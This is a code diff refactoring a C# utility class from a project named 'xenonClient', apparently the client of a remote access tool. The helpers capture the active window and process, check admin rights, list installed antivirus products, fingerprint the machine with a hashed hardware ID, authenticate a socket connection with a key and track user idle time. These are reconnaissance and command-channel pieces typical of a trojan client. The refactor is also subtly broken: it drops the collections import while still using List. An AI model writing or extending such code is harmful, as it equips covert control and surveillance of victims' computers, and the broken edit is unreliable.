@@ -1,24 +1,19 @@
 ﻿using Microsoft.Win32;
 using System;
-using System.CodeDom;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Management;
-using System.Net;
 using System.Net.Sockets;
-using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
-using System.Xml.Linq;
 
 namespace xenonClient
 {
     public class Utils
     {
+        // P/Invoke declarations for external Windows functions
         [DllImport("shell32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool IsUserAnAdmin();
@@ -38,14 +33,9 @@ namespace xenonClient
         [DllImport("User32.dll")]
         private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
 
-
-        [DllImport("user32.dll")]
-        private static extern bool CloseHandle(IntPtr hObject);
-
         internal struct LASTINPUTINFO
         {
             public uint cbSize;
-
             public uint dwTime;
         }
 
@@ -53,104 +43,82 @@ namespace xenonClient
         {
             return await Task.Run(() => GetCaptionOfActiveWindow());
         }
+        // Synchronously gets the caption (title) of the active window
         public static string GetCaptionOfActiveWindow()
         {
-            string strTitle = string.Empty;
             IntPtr handle = GetForegroundWindow();
-            int intLength = GetWindowTextLength(handle) + 1;
-            StringBuilder stringBuilder = new StringBuilder(intLength);
-            if (GetWindowText(handle, stringBuilder, intLength) > 0)
-            {
-                strTitle = stringBuilder.ToString();
-            }
-            try
+            int length = GetWindowTextLength(handle) + 1;
+            StringBuilder stringBuilder = new StringBuilder(length);
+            if (GetWindowText(handle, stringBuilder, length) > 0)
             {
                 uint pid;
                 GetWindowThreadProcessId(handle, out pid);
-                Process proc=Process.GetProcessById((int)pid);
-                if (strTitle == "")
-                {
-                    strTitle = proc.ProcessName;
-                }
-                else 
-                {
-                    strTitle = proc.ProcessName + " - " + strTitle;
-                }
+                Process proc = Process.GetProcessById((int)pid);
+                string title = stringBuilder.ToString();
+                string processName = proc.ProcessName;
                 proc.Dispose();
+                return string.IsNullOrEmpty(title) ? processName : $"{processName} - {title}";
             }
-            catch 
-            { 
-                
-            }
-            return strTitle;
+            return string.Empty;
         }
 
         public static bool IsAdmin()
         {
-            bool admin = false;
             try
             {
-                admin = IsUserAnAdmin();
+                return IsUserAnAdmin();
             }
-            catch { }
-            return admin;
+            catch
+            {
+                return false;
+            }
         }
+
+        // Retrieves the installed antivirus product name
         public static string GetAntivirus()
         {
             List<string> antivirus = new List<string>();
             try
             {
-                string Path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
-                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct"))
+                string path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(path, "SELECT * FROM AntivirusProduct"))
                 {
-                    foreach (var Instance in MOS.Get())
+                    foreach (ManagementObject instance in searcher.Get())
                     {
-                        string anti = Instance.GetPropertyValue("displayName").ToString();
-                        if (!antivirus.Contains(anti)) 
+                        string displayName = instance.GetPropertyValue("displayName").ToString();
+                        if (!antivirus.Contains(displayName))
                         {
-                            antivirus.Add(anti);
+                            antivirus.Add(displayName);
                         }
-                        Instance.Dispose();
                     }
-                    if (antivirus.Count == 0) 
-                    {
-                        antivirus.Add("N/A");
-                    }   
                 }
-                return string.Join(", ", antivirus);
             }
             catch
             {
-                if (antivirus.Count == 0)
-                {
-                    antivirus.Add("N/A");
-                }
-                return string.Join(", ", antivirus);
+
             }
+            return antivirus.Count > 0 ? string.Join(", ", antivirus) : "N/A";
         }
 
+        // Retrieves the Windows version and architecture
         public static string GetWindowsVersion()
         {
-            string r = "";
             using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
             {
-                ManagementObjectCollection information = searcher.Get();
-                if (information != null)
+                foreach (ManagementObject obj in searcher.Get())
                 {
-                    foreach (ManagementObject obj in information)
-                    {
-                        r = obj["Caption"].ToString() + " - " + obj["OSArchitecture"].ToString();
-                    }
-                    information.Dispose();
+                    return $"{obj["Caption"]} - {obj["OSArchitecture"]}";
                 }
             }
-            return r;
+            return "Unknown";
         }
+        // Generates a hardware ID based on system information
         public static string HWID()
         {
             try
             {
-                return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion,new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
+                string data = string.Concat(Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
+                return GetHash(data);
             }
             catch
             {
@@ -158,32 +126,37 @@ namespace xenonClient
             }
         }
 
-        public static string GetHash(string strToHash)
+        // Computes an MD5 hash of the given string and returns the first 20 characters in uppercase
+        public static string GetHash(string input)
         {
-            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
-            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
-            bytesToHash = md5Obj.ComputeHash(bytesToHash);
-            StringBuilder strResult = new StringBuilder();
-            foreach (byte b in bytesToHash)
-                strResult.Append(b.ToString("x2"));
-            return strResult.ToString().Substring(0, 20).ToUpper();
+            using (MD5 md5 = MD5.Create())
+            {
+                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
+                byte[] hashBytes = md5.ComputeHash(inputBytes);
+                StringBuilder sb = new StringBuilder();
+                foreach (byte b in hashBytes)
+                {
+                    sb.Append(b.ToString("x2"));
+                }
+                return sb.ToString().ToUpper().Substring(0, 20);
+            }
         }
-        public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int type = 0, int ID = 0, Action<Node> OnDisconnect = null)
+        // Asynchronously connects to a socket and performs setup
+        public static async Task<Node> ConnectAndSetupAsync(Socket socket, byte[] key, int type = 0, int ID = 0, Action<Node> onDisconnect = null)
         {
-            Node conn;
             try
             {
-                conn = new Node(new SocketHandler(sock, key), OnDisconnect);
-                if (!(await conn.AuthenticateAsync(type, ID)))
+                Node connection = new Node(new SocketHandler(socket, key), onDisconnect);
+                if (!(await connection.AuthenticateAsync(type, ID)))
                 {
                     return null;
                 }
+                return connection;
             }
             catch
             {
                 return null;
             }
-            return conn;
         }
         public async static Task RemoveStartup(string executablePath) 
         {
@@ -362,11 +335,10 @@ namespace xenonClient
         }
         public static uint GetIdleTime()
         {
-            LASTINPUTINFO lastInPut = new LASTINPUTINFO();
-            lastInPut.cbSize = (uint)Marshal.SizeOf(lastInPut);
-            GetLastInputInfo(ref lastInPut);
-            return ((uint)Environment.TickCount - lastInPut.dwTime);
+            LASTINPUTINFO lastInput = new LASTINPUTINFO();
+            lastInput.cbSize = (uint)Marshal.SizeOf(lastInput);
+            GetLastInputInfo(ref lastInput);
+            return ((uint)Environment.TickCount - lastInput.dwTime);
         }
-
     }
 }
